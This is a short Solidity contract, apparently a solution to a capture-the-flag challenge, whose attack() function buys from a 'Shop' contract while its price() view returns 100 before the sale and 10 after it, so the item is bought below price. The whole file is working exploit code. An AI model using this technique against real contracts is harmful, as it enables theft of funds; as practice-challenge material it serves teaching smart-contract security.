// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Shop {
    function isSold() external view returns (bool);
    function buy() external;
}

contract Buyer {
    Shop private _target;

    constructor(Shop target) {
        _target = target;
    }

    function price() external view returns (uint256) {
        if (_target.isSold() == true) {
            return 10;
        }
        return 100;
    }

    function attack() external {
        _target.buy();
    }
}
